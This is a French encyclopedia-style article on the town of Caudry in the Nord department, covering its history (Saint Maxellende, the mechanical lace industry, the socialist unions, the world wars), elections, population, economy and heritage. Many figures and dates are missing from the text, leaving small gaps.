Les voies principales qui traversent la ville (rue de Saint-Quentin, rue du Maréchal-Leclerc, rue Henri-Barbusse…), ne sont que les anciennes routes qui reliaient autrefois Caudry aux villages voisins : Béthencourt, Ligny-en-Cambrésis, Beauvois-en-Cambrésis. Elles sont souvent étroites, parfois sinueuses et peu adaptées à la circulation automobile urbaine. Ceci explique la construction dans les années 1980 d'un boulevard qui contourne la ville par l'est et relie le quartier de la gare et la zone industrielle au sud à la zone commerciale et à la route départementale 643 au nord. Un second contournement est prévu à l'ouest.
Logement.
En 2007, Caudry comptait , auxquelles s'ajoutaient vacants, soit 7,7 % du total, et un faible nombre de résidences secondaires. Les maisons représentaient 81,3 % des résidences individuelles, pourcentage en augmentation par rapport au recensement de 1999 (78,5 %) et supérieur à celui observé dans le département du Nord (68,8 %).
La part de résidences principales datant d'avant 1949 s'élevait à 49,4 %. Pour les constructions plus récentes, 28,4 % des logements dataient d'entre 1949 et 1974 et 22,2 % d'après 1975.
Projets d'aménagements.
Les projets d'aménagements, en cours ou à l'étude, concernent :
Toponymie.
Caudry est mentionné dès le sous la forme "Calderiacum", puis "Calderiaco", et, aux , comme "Caudri", "Cauderi" ou "Caudry". Le mot est formé d'un nom de personne "*Caldarius" ou "*Caldarus" et du suffixe d'origine celtique -(i), très répandu dans toute la Gaule. Caudry serait donc « le domaine de "*Caldarius" ».
Le [k] initial s'explique par la situation de Caudry au nord de la ligne Joret. Il a pour équivalent au sud Chaudrey (Aube, "Calderiacum" 1209) et en nord occitan Chaudeyrac (Lozère, "Caldeyracum" 1337).
Histoire.
Préhistoire et antiquité.
Un gisement moustérien découvert en 1877 à Busigny, à une dizaine de kilomètres au sud-est de Caudry, et fouillé à nouveau en 1972, atteste d'une présence humaine dès le paléolithique moyen. Par ailleurs, des fouilles réalisées en 1997 au lieu-dit « Les Bois Blancs » à Caudry ont permis de conclure à la possibilité d'une occupation humaine au néolithique, des éclats de silex nombreux ayant été recueillis sans toutefois que des structures datant de cette époque aient été identifiées.
Sur le même site a été mise au jour une exploitation agricole du Haut-Empire romain () dont l'emplacement était déjà occupé à l'époque gauloise. Du reste d'autres villas ont été identifiées par la photographie aérienne dans le Cambrésis. À l'époque romaine le territoire de Caudry était en Gaule belgique, dans la cité des Nerviens dont la capitale fut d'abord Bavay, puis Cambrai sous le Bas-Empire.
Histoire médiévale et moderne.
Maxellende.
Si les origines de Caudry ne sont pas précisément connues, elles semblent remonter au moins à l'ère mérovingienne, puisque c'est à cette époque que les nombreux récits qui en ont été faits situent le martyre de Maxellende. Le principal est une biographie du provenant sans doute du monastère Saint-Martin de Cambrai.
Selon ce récit Maxellende, issue d'une famille de l'aristocratie foncière, était née à "Villa Calderiacensis", aujourd'hui Caudry. Elle avait été promise par son père Humlinus à Harduin d'Amerval, fils du seigneur de Solesmes. Ayant décidé de consacrer sa vie à Dieu, Maxellende repoussa ce mariage. Lorsque Harduin tenta de l'enlever, elle s'échappa, lui résista, et il la tua d'un coup de poignard. Il perdit la vue aussitôt. La tradition place cet évènement le , sous l'épiscopat de Vindicien, évêque d'Arras et de Cambrai. La dépouille de Maxellende fut inhumée dans le village de Saint-Souplet. En 673, comme on rapportait en cortège les ossements de Maxellende à Caudry, Harduin d'Amerval se repentit sur son passage et recouvra la vue. À la suite de ce qui fut considéré comme un miracle, Vindicien proclama la sainteté de Maxellende, et un pèlerinage fut établi à Caudry. Au les reliques de la sainte furent transportées à l'abbaye Saint Martin de Cambrai. C'est au que l'évêque Rothard fit installer la châsse dans la cathédrale de Cambrai et que Maxellende devint, avec Saint Géry, la patronne secondaire du diocèse. Enfin, au , les reliques furent données par l'évêque Gérard à l'abbaye Saint-André du Cateau qu'il avait fondée. Elles ne revinrent à Caudry que pendant la révolution, en 1791.
Du Moyen Âge à la Révolution française.
Modeste village jusqu'à son industrialisation au , Caudry n'a pas un passé comparable à celui des villes voisines de Cambrai ou Le Cateau-Cambrésis. Son histoire suivit celle du Cambrésis, dont la suzeraineté fut donnée en 1007 à l'évêque de Cambrai par l'empereur . Le territoire de Caudry se trouva à cette date divisé en deux parties : tandis que Bourneville et Le Coquelet dépendaient du comté de Cambrésis, la plus grande partie avec Frenèches, La Guisette, Potelle et Tabeaumez formait une enclave du comté de Hainaut dans le Cambrésis. Le village voisin d'Audencourt, commune rattachée à Caudry en 1964, était quant à lui l'une des douze pairies du Cambrésis.
Les seigneurs de Caudry sont rarement cités dans les récits anciens, contrairement à ceux des villages environnants. Un seigneur Almaric de Caudry est mentionné en 1007. Un autre Almaricus de Calderiaco est présent en 1096 au tournoi d'Anchin. En 1184, le châtelain est Nicolas de Caudry, l'un des six pairs de Valenciennes.
Caudry fut annexé par le royaume de France avec l'ensemble du Cambrésis par le traité de Nimègue signé en 1678, après la prise de Cambrai par en 1677.
Le dernier seigneur de Caudry fut Charles Cordier, conseiller au parlement de Flandres, qui réunit entre ses mains les terres dépendant de Caudry-Hainaut et de Caudry-Cambrésis. Ses biens furent confisqués à la Révolution.
Lors de la création des départements en 1793, Caudry fut rattaché au canton d'Estourmel (et à partir de 1810 au canton de Clary) et au district de Cambrai dans le département du Nord.
En 1794, une armée de la Convention commandée par le général René-Bernard Chapuis tentait de dégager Landrecies assiégée par des coalisés austro-anglais. Le 26 avril, les colonnes françaises rencontrèrent l'ennemi au sud-est de Caudry, entre Audencourt et le Tronquoy, et furent sévèrement battues. Les combats furent si meurtriers que le ruisseau qui coule à cet endroit a gardé le nom de « riot des Morts ».
Histoire contemporaine.
L'industrialisation au.
Les origines.
Valenciennes, et surtout Cambrai, étaient, sous l'Ancien Régime, les centres d'une industrie prospère des « toilettes » ou « batistes ». Cette production migra peu à peu dans les campagnes, si bien que le tissage à domicile était devenu l'activité principale de l'ensemble des villages du Cambrésis : à la fin du plus de métiers, dans le Hainaut et le Cambrésis, tissaient des toiles fines; au début du certains villages du Cambrésis comptaient jusqu'à 400 ou 500 métiers. Cette activité avait commencé à décliner dès le règne de Louis XIV pour de multiples raisons. La Révolution française, les guerres qui suivirent, et le blocus continental accentuèrent encore ce déclin. Cette situation explique, au moins en partie, l'implantation dans la région au d'une industrie des tulles et dentelles mécaniques, bénéficiant d'une part d'une main d'œuvre déjà formée et offrant d'autre part aux tisserands des campagnes la possibilité de trouver une activité de substitution.
Les métiers à tulle furent inventés en Angleterre au début du siècle : à Nottingham en 1809, John Heathcoat fit breveter son invention d'un métier à pédales qui produisait mille treilles de tulle à la minute, tandis qu'au fuseau les dentellières en faisaient cinq ou six. Dans les années suivantes, de nombreux perfectionnements virent le jour, jusqu'à l'utilisation de la vapeur en 1822 qui permit l'installation de métiers en usines. Le métier à dentelles fut mis au point en France quelques années plus tard. À Lyon, en 1824, Colas et Delompré adaptèrent au métier à tulle Mechlin le système Jacquard de cartes perforées permettant de « programmer » la sélection des fils de chaîne et d'obtenir des dessins. En 1838 à Cambrai, Ferguson et Jourdan appliquèrent le système Jacquard au métier Leavers, créant une imitation de la dentelle de Chantilly, qui prit le nom de « dentelle de Cambrai ».
Des premiers métiers à la prospérité.
Dès 1815 le premier métier à tulle anglais fut installé en France, à Valenciennes. L'Angleterre exportait son tulle en France mais interdisait l'exportation des machines pour tenter d'en conserver le monopole. En Angleterre même, le brevet déposé par Heathcoat et Lacey limitait les possibilités des autres inventeurs ou mécaniciens, tentés dès lors de s'établir à l'étranger. Enfin en France la lutte contre l'importation des marchandises étrangères était telle qu'elle provoqua en 1826 le mécontentement des industriels, des agriculteurs et des commerçants. Ces différents facteurs expliquent que de nombreux mécaniciens anglais introduisirent dans le nord de la France, pièce par pièce et en fraude, des métiers à tulle.
C'est en 1823 ou 1825 que Germain Carpriau installe le premier métier à tulle dans le Cambrésis, à Beauvois. En 1826, Placide Gabet installe le premier métier à Caudry. Dès 1833 l'Annuaire statistique du département du Nord signale à Caudry 20 fabriques de tissu de coton, 7 fabriques de tulle et une fabrique de métiers à tulle. Toutefois les débuts sont difficiles, car l'industrie française du tulle souffre de la concurrence des produits anglais, plus compétitifs. En 1826, l'Angleterre dispose de totalisant -vapeur, contre respectivement 525 et en France.
Mais au début des années 1830, lors de la monarchie de Juillet, la lutte contre l'importation en fraude de tulle anglais s'intensifie, ce qui aide l'industrie à se développer. En 1838, Théophile Tofflin commence la fabrication du tulle fantaisie, et à partir de cette époque la situation de l'industrie du tulle s'améliore. En 1850 plus de , hommes, femmes et enfants, travaillent aux métiers à tisser à domicile, dans les cantons qui entourent Caudry : Solesmes, Le Cateau, Carnières, Clary. À partir de 1850 apparaissent des métiers mus par la vapeur. Le premier métier à guipure est installé en 1865.
Cependant le traité de libre échange entre la France et l'Angleterre, signé en 1860, eut un effet désastreux sur l'industrie du Cambrésis, dont l'équipement en machines restait très inférieur à celui de l'Angleterre. Des pétitions adressées à l'Empereur Napoléon III par les fabricants, puis par les ouvriers, restèrent sans effet. De 350 en 1860, le nombre de métiers en activité passa à 147 sept ans plus tard et on comptait 300 indigents à Caudry.
La prospérité vient enfin à partir des années 1880 : l'essor industriel de la France, le goût du luxe, l'engouement pour la dentelle dans la mode féminine favorisent l'industrie caudrésienne. Entre 1881 et 1901 la population double presque. De en 1804, Caudry passe à en 1911 et devient une ville où se juxtaposent encore aujourd'hui corons ouvriers, maisons de maître et ateliers et usines textiles. On compte à cette époque à Caudry 120 fabricants et une dizaine de grandes usines disposant de matériel moderne : 650 métiers à dentelles, 400 métiers à tulle, 150 machines à broder. Des maisons de commission anglaises et allemandes s'installent à Caudry, ainsi qu'un consulat américain. Cet essor est brutalement arrêté par la Première Guerre mondiale.
Syndicats ouvriers et socialisme.
Le développement de l'industrie s'accompagna d'une forte progression du syndicalisme et des idées socialistes, notamment sous l'influence de Jules Guesde, dont le Parti ouvrier français, fondé en 1882, s'appuyait sur de nombreux groupes socialistes et syndicats ouvriers dans la région de Lille, le bassin minier, le Cambrésis et le bassin de la Sambre.
Si la Confédération générale du travail fut constituée à Limoges en 1895, les ouvriers caudrésiens n'y adhérèrent pas aussitôt, préférant se regrouper sous la forme de sociétés d'assistance, de jeux ou de secours mutuels. La première association ouvrière de Caudry date de 1883, quand fut fondé le « syndicat à casquettes » ou « clique à chariots », association amicale sans action revendicative, transformée l'année suivante en société de secours mutuel sous le nom d'« Union des ouvriers tullistes ». Le premier véritable syndicat fut fondé en 1890 à l'instigation d'Eugène Fiévet secondé par Ernest Plet, ouvriers tullistes, sous le nom de « Syndicat des tullistes et similaires ». Les ouvriers étaient alors payés différemment par leurs employeurs, certains travaux n'étaient pas rémunérés, et le temps de travail n'était pas limité. Aussi ce syndicat chercha-t-il à obtenir une tarification homogène du travail. L'échec des négociations entraîna la première grève à Caudry, en 1891. Elle opposa, parfois violemment, grévistes et « moutons noirs », et fut finalement brisée par les gendarmes et la troupe.
L'échec de cette grève amena une désaffection pour le syndicat. Cependant vers 1893 Eugène Fiévet en fonda un nouveau, réservé aux dentelliers pour plus de cohésion, tandis que les autres professions restèrent longtemps sans organisation syndicale. Un tarif fut finalement accepté par le patronat en 1897, mais dénoncé dès l'année suivante : ceci conduisit à une deuxième grève, en 1898, qui fut victorieuse pour les syndicats ouvriers. En 1904, puis en 1907, les différents syndicats de la ville s'unirent en une « Union locale des chambres syndicales ouvrières de Caudry et environs ». D'autres grèves eurent lieu en 1911, à cause de la hausse des prix des produits agricoles, en 1914 pour des hausses de salaire. L'activité syndicale favorisa également la création en 1902 d'une coopérative de consommation, « La Caudrésienne », qui par étapes devint en 1931 « Les Coopérateurs d'Escaut et Sambre », société dont l'activité couvrait le Cambrésis et le Vermandois.
Aux élections municipales de 1892, Caudry, avec Roubaix, fut conquise par les socialistes du Parti ouvrier français. En 1900 Eugène Fiévet devint maire de Caudry, et député du Nord en 1906. En 1903 Jean Jaurès se rendit dans le Nord à l'occasion de la grande grève des tisseurs. Son passage à Caudry le 25 octobre marqua un temps fort dans la vie locale. Il devait revenir en 1911 pour l'inauguration du monument à Eugène Fiévet, mort en 1910.
De la Première à la Seconde Guerre mondiale.
Durant la Première Guerre mondiale, Caudry et le Cambrésis furent occupés par les troupes allemandes pendant presque toute la durée du conflit. Les troupes allemandes entrèrent dans la ville le 27 août 1914 au matin. La mairie servit de "Kommandantur" à l'armée d'occupation. À Caudry comme ailleurs dans le Nord, l'occupation par les troupes allemandes fut lourde : jusqu'à furent hébergés dans la ville, pour qui y étaient restés. Les réquisitions furent nombreuses, et le matériel des usines fut pillé, notamment pour le cuivre, le plomb, l'étain dont manquaient les Allemands. La ville fut libérée par la anglaise le 10 octobre 1918. Le cimetière militaire britannique et le cimetière militaire allemand furent créés à cette époque à côté du cimetière communal. Le carré militaire français de Caudry est créé en 1920.
En 1920, le conseil municipal décida d'élever un monument à la mémoire des morts pendant la guerre. Œuvre du statuaire Paul Theunissen, le monument aux morts représente l'Humanité reconnaissante, sous les traits d'une jeune fille parée d'une couronne de fleurs, qui reçoit dans son bras gauche un poilu expirant. Sur les faces latérales du monument sont représentés quatre bas-reliefs en bronze évoquant le poilu dans sa tranchée pensant à sa ville natale, l'évacuation en , la libération de la cité et la visite aux tombes. Le monument fut inauguré le .
La remise en route de l'industrie textile après la guerre fut lente et difficile en raison des destructions, du manque de matières premières, de transports et d'énergie, et de la concurrence nouvelle de la Suisse. Après 1922 l'activité reprit, les métiers endommagés ou détruits pendant la guerre furent remplacés par du matériel moderne, de nouvelles usines furent construites. Cependant la crise économique de 1929 frappa durement Caudry : en 1933, la production de tulle était presque entièrement arrêtée. Un rapport de la Chambre de Commerce de Cambrai donnait 26 millions de chiffre d'affaires dans les tulles et dentelles en 1935, contre 320 millions en 1930. On compta jusqu'à à Caudry. Des métiers furent vendus comme ferraille ou expédiés en Belgique, en Italie ou en Espagne.
La guerre, en septembre 1939, vint mettre un nouveau coup d'arrêt à la reprise économique de la fin des années 1930. La ville subit une nouvelle occupation allemande dès le 18 mai 1940. Au printemps de 1942 un petit groupe de résistants se constitua à Caudry autour de Gaston Dassonville. Il aidait les réfractaires et les aviateurs alliés abattus et mena des actions de renseignement et de sabotage. La blindée américaine entra dans Caudry le 3 septembre 1944.
Reconversion industrielle.
Malgré la reprise de la fabrication des tulles, dentelles et broderies après les deux guerres, 60 % des entreprises existant en 1914 avaient disparu en 1953.
La dentelle demeure le fondement du tissu industriel local avec douze dentelliers qui emploient encore 800 personnes.
Cependant l'activité économique repose désormais largement sur la diversification des activités. Ainsi, depuis le début des années 1970, des secteurs tels que l'agroalimentaire, les cosmétiques ou encore l'imprimerie se sont implantés sur la zone industrielle de plus de 100 hectares, qui accueille une trentaine d'entreprises employant .
Par ailleurs, une zone artisanale et commerciale achevée en 2010 en bordure de la route départementale 643 contribue à l'activité économique de la ville.
Les nouvelles structures (norme HQE du lycée Jacquard) et la rénovation du centre-ville contribuent également à une modernisation de la cité.
Politique et administration.
Rattachements administratifs et électoraux.
La commune fait partie de l'arrondissement de Cambrai du département du Nord, en région Hauts-de-France. Pour l'élection des députés, elle dépend de la dix-huitième circonscription du Nord.
Elle faisait partie depuis 1793 du canton de Clary. Dans le cadre du redécoupage cantonal de 2014 en France, la commune devient le bureau centralisateur du nouveau canton de Caudry.
La ville de Caudry est dans le ressort de la cour d'appel de Douai, du tribunal de grande instance, du tribunal d'instance et du conseil de prud'hommes de Cambrai, et à la suite de la réforme de la carte judiciaire engagée en 2007, du tribunal de commerce de Douai.
Intercommunalité.
La commune était le siège de la communauté de communes du Caudrésis créée le .
Celle-ci a fusionné le avec la communauté de communes du Pays de Matisse pour constituer la communauté de communes du Caudrésis - Catésis (devenue en 2019 la communauté d'agglomération du Caudrésis - Catésis), dont la ville de Beauvois-en-Cambrésis est désormais le siège.
La ville est également membre, en 2017, des syndicats suivants :
Tendances politiques et résultats.
Caudry est historiquement une ville « de gauche » et cette tendance semble confirmée par la plupart des consultations électorales récentes, même si les élections municipales de 2008 et 2014 et les élections législatives de 2007, 2012 et 2017 ont vu la victoire de candidats de droite.
Au deuxième tour des élections législatives de 2017, 76,45 % des électeurs caudrésiens ont voté pour Guy Bricout, candidat apparenté UDI et maire de Caudry (63,67 % dans la du Nord) et 23,55 % pour Claire Pommeyrol-Burlet (REM) (36,33 % dans la circonscription), avec un taux de participation de 44,79 % à Caudry et de 41,56 % dans la circonscription.
Au premier tour de l'élection présidentielle de 2017 les quatre candidats arrivés en tête à Caudry sont Marine Le Pen (FN, 35,77 %), Jean-Luc Mélenchon (LFI, 19,53 %), Emmanuel Macron (EM, 17,13 %) et François Fillon (Les Républicains, 13,33 %) avec un taux de participation de 72,37 %. Au second tour Marine Le Pen arrive en tête avec 56,54 % des voix et un taux de participation de 69,55 %.
Au deuxième tour des élections régionales de 2015, 54,09 % des suffrages exprimés sont allés à la liste conduite par Xavier Bertrand (Les Républicains), et 45,91 % à la liste FN de Marine Le Pen, pour un taux de participation de 55,42 %.
Au second tour des élections départementales de 2015, Guy Bricout et Anne-Sophie Lécuyer (Union de la Droite) arrivent en tête à Caudry avec 71,22 % des suffrages exprimés, et Jean Danjou et Mélanie Disdier (FN) 28,78 %, pour un taux de participation de 50,36 % ( pour et ).
Aux élections municipales de 2014, la liste « "Ensemble pour Caudry" » de Guy Bricout (DVD) a obtenu 69,58 % des suffrages et 29 élus, la liste « "Caudry Bleu Marine" » de Mélanie Disdier (FN) 14,21 % et 2 élus, la liste « "Caudry agir autrement" » de Christian Dervaux (PS) 9,24 % et 1 élu, la liste « "À Caudry, l'humain d'abord" » de Brigitte Lefebvre (Front de gauche) 5,42 % et 1 élu et la liste « "Solidaristes" » de Joël Lamand (Alliance royale) 1,52 %, pour un taux de participation de 61,16 %.
Au premier tour de l'élection présidentielle de 2012, les quatre candidats arrivés en tête à Caudry sont François Hollande (PS, 32,55 %), Marine Le Pen (FN, 23,87 %), Nicolas Sarkozy (UMP, 20,02 %) et Jean-Luc Mélenchon (Front de gauche, 11,98 %) avec un taux de participation de 71,72 %. Au second tour, François Hollande arrive en tête avec 59,98 % des voix et un taux de participation de 70,98 %.
Au deuxième tour des élections législatives de 2012, 59,36 % des électeurs de Caudry ont voté pour François-Xavier Villain (UDI) (57,63 % dans la du Nord), 40,64 % pour Martine Filleul (PS) (42,37 % dans la circonscription), avec un taux de participation de 51,07 % à Caudry et de 55,61 % dans la circonscription.
Au deuxième tour des élections régionales de 2010, 55,57 % des électeurs ont voté pour la liste conduite par Daniel Percheron (PS, Front de gauche, Europe Écologie), 22,51 % pour celle de Valérie Létard (UMP), et 21,92 % pour la liste de Marine Le Pen (FN), pour un taux de participation de 43,90 %.
Aux élections européennes de 2009, les deux meilleurs scores à Caudry étaient ceux de la liste du Parti socialiste conduite par Gilles Pargneaux, qui a obtenu soit 25,43 % des suffrages exprimés (département du Nord 19,55 %), et de la liste de la Majorité présidentielle conduite par Dominique Riquet, qui a obtenu soit 20,03 % des suffrages exprimés (département du Nord 24,57 %), pour un taux de participation de 32,97 %.
Aux élections municipales de 2008, la liste « "Ensemble pour Caudry" » de Guy Bricout (Majorité présidentielle) a obtenu 68,20 % des suffrages et 28 élus, la liste « "Caudry pour tous" » de Christiane Marande-Podevin (PS) 24,68 % et 4 élus et la liste « "Gestion plus adroite" » de Mélanie Disdier (Front national) 7,12 % et 1 élu, pour un taux de participation de 61,98 %.
Au deuxième tour de l'élection présidentielle de 2007, 55,37 % des électeurs caudrésiens ont voté pour Ségolène Royal (PS), et 44,63 % pour Nicolas Sarkozy (UMP), avec un taux de participation de 76,32 %.
Au deuxième tour des élections législatives de 2007, 54,12 % des électeurs de Caudry ont voté pour François-Xavier Villain (DLR) (57,45 % dans la du Nord), 45,88 % pour Brigitte Douay (PS) (42,55 % dans la circonscription), avec un taux de participation de 57,46 % à Caudry et de 60,08 % dans la circonscription.
Administration municipale.
La population de la commune étant comprise entre et , le conseil municipal comprend 33 membres.
À la suite des élections municipales de 2020, la composition du conseil municipal de Caudry est la suivante :
Liste des maires.
La liste des maires de Caudry est connue depuis 1801, elle figure sur une plaque située dans le bâtiment de la mairie. Depuis 1945, sept maires se sont succédé :
Politique environnementale.
Caudry pratique le tri sélectif et gère une déchèterie depuis le mars 1992.
La protection et la mise en valeur de l'environnement font partie des compétences de la communauté de communes du Caudrésis - Catésis. Ses « brigades vertes » interviennent sur le territoire de l'ensemble des communes pour la création et l'entretien des espaces verts, l'aménagement de l'espace rural, les plantations et l'abattage d'arbres.
La communauté de communes a également décidé, début 2009, d'ajouter à ses compétences la diversification des sources d'énergie. Un cabinet d'études a retenu cinq zones potentielles pour l'implantation d'éoliennes.
Jumelages.
La ville de Caudry est jumelée avec
En juillet 1964, une équipe de bénévoles de l'Amicale laïque de Caudry placée sous la direction de Pierre Bazin accueille le "Jugendmusikkorps" de Wedel. Des liens d'amitié se nouent entre les deux villes et les échanges s'intensifient. Le jumelage est officialisé à Wedel le 8 juin 1985 et à Caudry le 25 octobre 1986. Depuis, un comité assure la pérennité des relations entre Wedel et Caudry.
Population et société.
Démographie.
Ses habitants sont appelés les "Caudrésiens".
Caudry se classe par sa population au deuxième rang dans l'arrondissement de Cambrai. Le nombre d'habitants augmente rapidement à la fin du avec le développement de l'industrie textile, culminant à en 1911. Après les baisses dues aux deux guerres mondiales, la croissance démographique reprend lentement et la population de la ville est de au recensement de 2009.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 38,9 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 23,9 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51,87 % de femmes, légèrement supérieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
Caudry est rattachée à la circonscription de Cambrai-sud de l'inspection académique du Nord dans l'académie de Lille.
La commune gère quatre écoles maternelles (Batisse-et-Laïte, Jean-Lebas, Jules-Ferry et Françoise-Dolto) et quatre écoles élémentaires (Paul-Bert, Condorcet, Jean-Macé et Janssoone). L'école Sainte Maxellende (depuis 09/2013), ex-école Saint-Michel, est un établissement privé.
Le département du Nord gère deux collèges : le collège Jean-Monnet et le collège Jacques-Prévert.
La région Hauts-de-France gère le lycée polyvalent public Joseph-Marie-Jacquard, qui est l'un des premiers de France (le second après celui de Calais) à avoir intégré l'approche HQE, avec des toitures végétalisées, des matériaux sains, une climatisation par puits canadien, puits de lumière, récupération ou filtration/épuration des eaux pluviales, repas bio, etc.
Santé.
Caudry compte environ trente médecins généralistes et spécialistes. La ville dispose également de deux dispensaires médicaux : le centre d'action médico-sociale précoce (CAMSP) et le centre médico-scolaire, d'un centre médico-psychologique, d'une maison de retraite avec service de moyen séjour, l'établissement d'hébergement pour personnes âgées dépendantes Léonce-Bajart et d'une maison de retraite privée, La Dentellière, ouverte en 2011.
Les centres hospitaliers les plus proches sont ceux du Cateau-Cambrésis, de Cambrai et de Valenciennes.
Sports.
Il existe plus de quarante associations sportives à Caudry.
Caudry comptait par le passé deux piscines désormais fermées : la piscine « Tournesol » ainsi que l'espace nautique en plein air, la « piscine découverte ». Aujourd'hui les activités nautiques ont lieu à l'espace nautique intercommunal de Caudry. La ville compte également plusieurs salles de sport : la salle Pierre-de-Coubertin, construite en 1980 et rénovée en 2005, la salle Secrétin, la salle Paul-Bert, les courts de tennis de la rue Henri-Barbusse, la salle de danse, la salle des tullistes (avec mur d'escalade), la salle de tir, la salle Paul-Sautière et le Palais des Sports, construit entre 2003 et 2005. Cet équipement offre trois salles, dont une grande avec tribunes de 500 places.
Les terrains de sports incluent le stade Louis-Sandras (avec « Skate–Roller Park »), le stade Jean-Brac, le stade Jacques-Prévert, deux plateaux multisports, le boulodrome municipal. Caudry a trois terrains de jeux et de sports de quartiers : Maupassant, Négrier et Fénelon.
La base de loisirs du « val du Riot » d'une superficie de , exploitée par un syndicat intercommunal réunissant Caudry et Beauvois-en-Cambrésis, permet notamment la pratique de la pêche dans ses trois étangs, ainsi que du javelot et du tir à l'arc. Elle possède aussi un terrain de « beach-volley », des murs d'escalade, deux terrains de « boule et pétanque ».
Le Star Club caudrésien, fondé en 1903 (cofondateur : Léonce Bajart) et disparu en 1967 après sa fusion avec l'US Viesly, a gagné le championnat de France de football version Fédération cycliste et athlétique de France en 1909.
Médias.
Le quotidien régional "La Voix du Nord" publie une édition locale pour le Cambrésis. "L'Observateur du Cambrésis" est un hebdomadaire d'informations locales et d'annonces.
Les programmes de Radio BLC, station de radio associative, sont émis depuis Caudry. Les habitants de Caudry reçoivent également, outre certaines stations de radio nationales, les programmes de France Bleu Nord, de Chérie FM Cambrai et de RFM Nord.
La ville est couverte par les programmes de France 3 Nord-Pas-de-Calais et les chaînes nationales de la TNT. Elle reçoit également la chaîne régionale Wéo. Oxygen TV est une web TV « 100 % Cambrésis » consacrée aux informations locales.
Cultes.
Les Caudrésiens disposent de deux lieux de culte catholique : la basilique Sainte Maxellende et l'église Saint Barthélémy à Audencourt. Ces églises dépendent de la paroisse « Sainte Maxellende en Cambrésis » rattachée à l'archidiocèse de Cambrai.
Un temple antoiniste situé rue de Denain a été construit en 1922. Depuis sa fondation, huit desservants se sont succédé dans le temple.
Un temple de l'Église Réformée de France rattaché à la paroisse de Caudry et au consistoire Hainaut-Picardie fut construit sur un terrain acheté par la ville en janvier 1892 rue de la Paix.
La première pierre fut posée le et le conseil municipal approuva le procès-verbal de réception définitive des travaux le .
L'Association chrétienne pour l'étude de la bible (Témoins de Jéhovah) dispose également d'un lieu de culte à Caudry.
Économie.
Revenus de la population et fiscalité.
En 2008, le revenu fiscal médian par ménage était de , ce qui plaçait Caudry au rang parmi les communes de plus de 50 ménages en métropole.
Population active.
La population âgée de 15 à 64 ans s'élevait en 2007 à ( en 1999), parmi lesquelles on comptait 66,1 % d'actifs dont 52,7 % ayant un emploi et 13,4 % de chômeurs. En 2007, 53,3 % des actifs ayant un emploi et résidant dans la commune travaillaient à Caudry, 42,2 % dans une autre commune du département du Nord et 3,3 % dans une autre région, c'est-à-dire en Picardie.
La répartition par catégories socioprofessionnelles de la population active de Caudry fait apparaître, par rapport à la moyenne de la France métropolitaine, une sous-représentation de toutes les catégories à l'exception de celle des « ouvriers », ce qui confirme la persistance de l'activité industrielle de la ville.
Répartition de la population active par catégories socioprofessionnelles (recensement de 2007)
Emploi.
La commune de Caudry fait partie de la zone d'emploi du Cambrésis et dispose d'une agence ANPE pour la recherche d'emploi.
En 2007 on comptait dans la commune, contre en 1999. Le nombre d'actifs ayant un emploi résidant dans la commune étant de , l'indicateur de concentration d'emploi est de 137,3 %, ce qui signifie que la commune offre approximativement un peu plus de quatre emplois pour trois Caudrésiens actifs. Cet indicateur était de 138,4 % en 1999.
La répartition par secteurs d'activité des emplois à Caudry fait apparaître le fort poids relatif du secteur industriel. L'emploi tertiaire (commerce, services, administrations) représente environ 60 % du total à Caudry, contre plus de 75 % en France métropolitaine.
Répartition des emplois par domaines d'activité (recensement de 2007)
Entreprises et commerces.
L'industrie textile reste bien représentée à Caudry avec une petite trentaine d'entreprises, notamment dans les textiles n.c.a., l'ennoblissement textile, la fabrication d'étoffes à mailles, de linge de maison et d'articles d'ameublement, de non-tissés. Les entreprises : Dentelle Sophie Hallette, Carpentier et Preux, Solstiss (fruit d'un regroupement, en 1974, de quatre entreprises) ainsi qu'une teinturerie spécialisée dans l'ennoblissement des dentelles les plus raffinées, La Caudresienne, comptent parmi les plus importantes dans ce secteur. Caudry est, avec Calais, le centre mondial de la dentelle mécanique « Leavers » et exporte plus de 80 % d'un produit raffiné, porté par exemple par Grace Kelly en 1956, Kate Middleton en 2011 et Amal Alamuddin lors de son mariage avec George Clooney en 2014, ou par Michelle Obama en 2009. Le label « Ville et Métiers d'Art » est venu couronner cette tradition de qualité en 1995.
Le paysage industriel s'est diversifié avec l'implantation en 1970 des parfums Sicos (groupe L'Oréal, qui est le premier employeur industriel du Cambrésis) et en 1982 de la Société des Produits Alimentaires de Caudry (SPAC) du groupe Nestlé (pizzas et produits surgelés Buitoni). Parmi les autres employeurs importants de la ville on compte également l'imprimerie Lenglet (offset et héliogravure pour magazines), les plastiques NP Nord, les emballages plastiques Chrystal Plastic, le centre Leclerc, et la société de transports par autocars Les Chemins de fer du Cambrésis.
La zone d'activités de la Vallée d'Hérie, au sud-est de Caudry, créée à la fin des années 1960, offre plus de , tandis que les implantations commerciales se concentrent dans la zone commerciale qui borde la RD 643.
Culture locale et patrimoine.
Caudry compte trois monuments inscrits à l'inventaire des monuments historiques :
Le Musée de la dentelle.
Le « Musée caudrésien des dentelles et broderies » est installé dans la fabrique de dentelle Théophile et Jean-Baptiste Carpentier, dont les bâtiments de briques datant de 1898, restaurés et modernisés par l'adjonction d'une verrière, sont typiques de l'architecture industrielle du siècle dernier.
À travers ses collections, le musée retrace l'histoire de la fabrication des tulles, des dentelles et des broderies mécaniques dans la région de Caudry. Il organise également des expositions temporaires et des ateliers pédagogiques pour les enfants.
Les souterrains.
Caudry possède un souterrain creusé dans la craie, probablement vers le , destiné à abriter la population ou le bétail lors des invasions. Resté ignoré jusqu'en 1847, il fut rendu accessible à la suite d'un effondrement et restauré par Jean-Adolphe Prioux, le maire de l'époque. Ce souterrain partait dans trois directions. La partie du souterrain située sous la rue de la Paix comportait de part et d'autre d'une galerie principale située à de profondeur sur une longueur de . Cette galerie était large de et haute de . En 1916-1917, des affaissements de terrain sur la place ont permis aux Allemands de redécouvrir une grande partie du souterrain qui fut déblayé et étayé. Le tout fut utilisé comme dépôt de munitions. Lors de leur retraite en 1918, les Allemands firent sauter l'entrée et une partie de la cavité.
Un souterrain existait à Aulicourt, dépendance de Béthencourt, que la tradition faisait aboutir dans la chapelle Sainte-Maxellende de l'église de Caudry, et qui aurait été emprunté par Maxellende elle-même, mais il s'agit là d'une légende.
Patrimoine religieux.
